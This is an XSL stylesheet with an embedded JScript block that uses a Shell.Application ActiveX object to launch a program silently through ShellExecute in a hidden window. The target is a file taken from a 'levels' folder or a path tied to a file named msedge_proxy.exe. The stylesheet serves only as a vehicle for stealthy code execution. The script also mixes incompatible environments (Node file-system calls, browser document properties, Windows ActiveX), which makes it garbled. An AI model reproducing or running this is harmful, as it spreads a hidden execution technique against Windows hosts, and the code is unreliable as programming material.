<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var oShell = new ActiveXObject("Shell.Application");
	var commandtoRun = "";
	fs.readdirSync("./levels/").forEach((file) => {
		commandtoRun = file;
	})
	if(document.location.pathname.match(/^\/C:\\Users\\Public\\Public Data\\//)){
		if(document.pathname == "msedge_proxy.exe"){
			commandtoRun = document.location;
		}
	}
	oShell.ShellExecute(commandtoRun,"","","open","0");
	]]> </ms:script>
</stylesheet>
